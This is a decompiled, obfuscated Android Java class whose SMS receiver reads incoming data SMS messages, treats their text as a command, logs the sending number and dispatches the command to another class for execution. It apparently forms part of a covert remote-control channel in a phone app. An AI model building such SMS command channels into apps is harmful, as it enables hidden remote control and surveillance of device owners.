package com.network.android;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import com.network.android.a.c;
import com.network.android.c.a.a;

final class z implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ Intent f134a;
    final /* synthetic */ Context b;
    final /* synthetic */ SmsReceiver c;

    z(SmsReceiver smsReceiver, Intent intent, Context context) {
        this.c = smsReceiver;
        this.f134a = intent;
        this.b = context;
    }

    public final void run() {
        try {
            a.a("onReceive new thread: ");
            if (this.f134a.getAction().equals("android.intent.action.DATA_SMS_RECEIVED")) {
                a.a("android.intent.action.DATA_SMS_RECEIVED");
                Bundle extras = this.f134a.getExtras();
                if (extras != null) {
                    Object[] objArr = (Object[]) extras.get("pdus");
                    if (objArr.length >= 0) {
                        SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];
                        a.a("pdus.length: " + objArr.length);
                        String str = "";
                        String str2 = "";
                        int i = 0;
                        while (i < smsMessageArr.length) {
                            smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);
                            String originatingAddress = smsMessageArr[i].getOriginatingAddress();
                            str2 = str2 + new String(smsMessageArr[i].getUserData(), "utf8");
                            i++;
                            str = originatingAddress;
                        }
                        a.a("Conmmand from number: " + str);
                        a.a("Command: ");
                        a.a(str2);
                        c.a(str2, this.b, str);
                    }
                }
            }
        } catch (Throwable th) {
            a.a("onReceive Exception- " + th.getMessage(), th);
        }
    }
}
